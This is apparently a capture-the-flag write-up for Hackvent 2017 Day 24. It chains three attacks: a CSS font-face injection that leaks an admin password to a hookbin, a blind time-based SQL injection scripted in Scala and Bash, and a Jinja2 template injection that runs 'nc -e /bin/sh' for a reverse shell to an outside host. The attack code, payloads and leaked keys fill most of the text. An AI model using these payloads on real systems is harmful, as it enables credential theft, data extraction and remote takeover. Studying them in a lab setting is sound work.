# Day 24: Chatterbox

*... likes to talk*

I love to chat secure and private.

For this I mostly use http://challenges.hackvent.hacking-lab.com:1087.

It's easy to create a private chat and start chatting without a registration.

[Chatterbox](http://challenges.hackvent.hacking-lab.com:1087/)

Hint #1: The admin is a lazy clicker boy and only likes `<a href="..."></a>`  
Hint #2: As a passionate designer, the admin loves different fonts.  
Hint #3: For step 2: I'd better be my own CA.  
Hint #4: For step 2: It's all about the state  
Hint #5: For step 3: Python programmers don't need {{ ninjas }}

### Solution

This challenge had three separate stages.

#### Stage 1: CSS injection

The Chatterbox was running on port [1087](http://challenges.hackvent.hacking-lab.com:1087/).

As a regular user I was able to create a private channel with my own CSS. This was very suspicious right from the beginning. Some form of CSS injection? But which and how?

The first hint indicated that it is possible to invite admin to my private channel. It didn't seem so because admin silently joined the channel but didn't respond to any post. I verified his presence by modifying CSS to send GET request to my hookbin on load.

The second hint about fonts sent me to the right direction and I found this [article](http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html) about @font-face unicode-range vulnerability.

I downloaded [original](files/styles-original.css "styles-original.css") chatterbox CSS.

```bash
$ wget -O styles-original.css -q http://challenges.hackvent.hacking-lab.com:1087/css/styles.css
$ dos2unix -q styles-original.css
``` 

Then I created my [modified](files/styles-pwned.css "styles-pwned.css") version with this Scala [script](../../src/main/scala/hackvent2017/Day24.scala#L15 "Day24.scala"):

```scala
val cssOriginal = Paths.get("hackvent2017/challenges/day24/files/styles-original.css")
val cssPwned = Paths.get("hackvent2017/challenges/day24/files/styles-pwned.css")
val endpoint = "https://hookb.in/E5V2ANXB"

val writer = Files.newBufferedWriter(cssPwned)
try {
  writer.append(ascii(Files.readAllBytes(cssOriginal)))
  for (ch <- '!' to '~') {
    writer.append(s"""
      |@font-face { /* '${ch}' */
      |    font-family: pwn;
      |    src: url("${endpoint}?char=${URLEncoder.encode(ch.toString, "UTF-8")}");
      |    unicode-range: U+${hex(ch.toInt, 4).toUpperCase};
      |}
      |""".stripMargin)
  }
  writer.append(s"""
    |#password {
    |    font-family: pwn;
    |}
    |""".stripMargin)
} finally {
  writer.close
}
``` 

It defines my own fictional `pwn` font family which uses hookbin to capture requests for individual characters by adding section like this for each printable character.
                                                                                                                         
```css
@font-face { /* 'a' */
    font-family: pwn;
    src: url("https://hookb.in/E5V2ANXB?char=a");
    unicode-range: U+0061;
}
``` 

In last step it assigns this font family to the `password` HTML element.

```css
#password {
    font-family: pwn;
}
```

Then I invited admin to my channel with this CSS and checked requests captured in my hookbin.

The admin's password was:

```
Christmas2017
```

I simply used it to login and then I got redirected to the [second stage](http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78).

#### Stage 2: SQL injection

The Message Board Admin Panel was running on port [1088](http://challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78).

This stage contained *Tools* section with a form which generated certificate based on submitted CRS.

Hints 3 and 4 directed me to the `state` field of CSR which suffered from SQL injection. 

I prepared a Bash [script](files/generate-cert.sh "generate-cert.sh") to generate CSR with state field passed as its argument, submit it and get the result certificate.

```bash
#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 STATE"
    exit 1
fi

STATE="$@"

openssl req -nodes -new -newkey rsa:2048 -sha256 -keyout /tmp/hv17-d24.key -out /tmp/hv17-d24.csr -subj "/C=GB/ST=$STATE/L=London/O=Hackvent/OU=1337/CN=1337.hackvent.com" &>/dev/null
[ $? -eq 0 ] || exit $?

CSR="$(cat /tmp/hv17-d24.csr)"
curl -s \
    -X POST "http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78" \
    -H 'content-type: application/x-www-form-urlencoded' \
    --data-urlencode "csr=$CSR" | sed 's/<br>/\n/g' > /tmp/hv17-d24.cert

rm -f /tmp/hv17-d24.key
rm -f /tmp/hv17-d24.cert
rm -f /tmp/hv17-d24.csr
```

Then I wrote a Scala [script](../../src/main/scala/hackvent2017/Day24.scala#L44 "Day24.scala") on top of the script which used blind time-based SQLi on that field to find useful data in the underlying MySQL database. 

```scala
val idChars = ('a' to 'z') ++ ('0' to '9') :+ '$' :+ '_' // case insensitive
val valueChars = ('a' to 'z') ++ ('A' to 'Z') ++ ('0' to '9') :+ '-' :+ '_' :+ ':' :+ '/' :+ '?' :+ '=' :+ '.' // case sensitive
val sleep = 3

/* -- database names extractor -- */

def databaseNameStmtBuilder()(c: Char, pos: Int, offset: Int): String =
  s"SELECT IF(substr(n,$pos,1)='$c',sleep($sleep),0)FROM(SELECT DISTINCT table_schema n FROM information_schema.tables LIMIT $offset,1)d"

def extractDatabaseNames(): Seq[String] = extractValues(databaseNameStmtBuilder(), idChars)
def extractDatabaseName(offset: Int): Option[String] = extractValue(databaseNameStmtBuilder(), idChars, offset)

/* -- table names extractor -- */

def tableNamesStmtBuilder(db: String)(c: Char, pos: Int, offset: Int): String =
  s"SELECT IF(substr(table_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.tables WHERE table_schema='$db'LIMIT $offset,1"

def extractTableNames(db: String): Seq[String] = extractValues(tableNamesStmtBuilder(db), idChars)
def extractTableName(db: String, offset: Int): Option[String] = extractValue(tableNamesStmtBuilder(db), idChars, offset)

/* -- column names extractor -- */

// query was too long to fit into CSR state field so the database name had to be removed from the where clause
def columnNameStmtBuilder(db: String, table: String)(c: Char, pos: Int, offset: Int): String =
  s"SELECT IF(substr(column_name,$pos,1)='$c',sleep($sleep),0)FROM information_schema.columns WHERE table_name='$table'LIMIT $offset,1"

def extractColumnNames(db: String, table: String): Seq[String] = extractValues(columnNameStmtBuilder(db, table), idChars)
def extractColumnName(db: String, table: String, offset: Int): Option[String] = extractValue(columnNameStmtBuilder(db, table), idChars, offset)

/* -- column values extractor -- */

def columnValueStmtBuilder(db: String, table: String, column: String)(c: Char, pos: Int, offset: Int): String =
  s"SELECT IF(BINARY substr($column,$pos,1)='$c',sleep($sleep),0)FROM $db.$table LIMIT $offset,1"

def extractColumnValues(db: String, table: String, column: String): Seq[String] = extractValues(columnValueStmtBuilder(db, table, column), valueChars)
def extractColumnValue(db: String, table: String, column: String, offset: Int): Option[String] = extractValue(columnValueStmtBuilder(db, table, column), valueChars, offset)

/* -- common extractor -- */

def extractValues(builder: (Char, Int, Int) => String, alphabet: Seq[Char]): Seq[String] = {
  val values = ListBuffer[String]()

  var offset = 0
  var found = false
  do {
    val value = extractValue(builder, alphabet, offset)
    if (value.isDefined) values += value.get
    found = value.isDefined
    offset += 1
  } while (found)

  values.toList
}

def extractValue(builder: (Char, Int, Int) => String, alphabet: Seq[Char], offset: Int): Option[String] = {
  val value = new StringBuilder()

  var end = false
  while (!end) {
    var found = false
    for (c <- alphabet) {
      if (!found) {
        if (checkSQL(builder(c, value.length+1, offset), sleep)) {
          value.append(c)
          found = true
          print(c)
        }
      }
    }
    end = !found
  }
  if (value.nonEmpty) println(s"\rfound: $value")

  if (value.nonEmpty) Some(value.toString) else None
}

def checkSQL(statement: String, sleep: Int): Boolean = time(() => generateCert(s"'OR($statement)OR'")) >= sleep

def generateCert(state: String): Unit = {
  val retcode = s"hackvent2017/challenges/day24/files/generate-cert.sh $state".!
  if (retcode != 0) throw new RuntimeException(s"Unexpected result code: $retcode")
}

val db = "hv24_2" // <-- extractDatabaseNames(): List(hv24_2, information_schema, mysql, performance_schema)
val table = "keystorage" // <-- extractTableNames(db): List(certificates, keystorage)
val column = "private_key" // <-- extractColumnNames(db, table): List(private_key)
val value = "challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw" // <-- extractColumnValue(db, table, column, 0)
```

It was very time consuming part but I managed to extract link to the last stage from column `private_key` of the first row of table `hv24_2.keystorage`. It contained this value:

```
challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
```

#### Stage 3: Template injection

The Easy Webshop was running on port [1089](http://challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw).

The last hint indicated it has something to do with SSTi vulnerability. I quickly realized it's referencing to [Jinja2](http://jinja.pocoo.org/docs/2.10/) templating engine for Python.

I found this useful [article](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html) which showed me how to exploit that vulnerability. I found that URL path is vulnerable but it took me some time to put all the necessary things together and make it work.

I started local netcat opened for incoming connections: 

```bash
ncat -p 44444 -k -v -l
```

Then I hit the following URL to get the reverse connection with shell to my local netcat.

```
http://challenges.hackvent.hacking-lab.com:1089/product%7b%7b%20''.__class__.__mro__[1].__subclasses__()[37](['nc -e /bin/sh 94.112.XXX.XXX 44444'],shell=True).communicate()%20%7d%7d?key=W5zzcusgZty9CNgw
```

The last step was to use the remote shell through the local netcat instance.

```bash
$ cat /home/flag
HV17-7h1s-1sju-t4ra-nd0m-flag
```

Here is a Scala [script](../../src/main/scala/hackvent2017/Day24.scala#L136 "Day24.scala") to automate it.

The result flag:

```
HV17-7h1s-1sju-t4ra-nd0m-flag
```
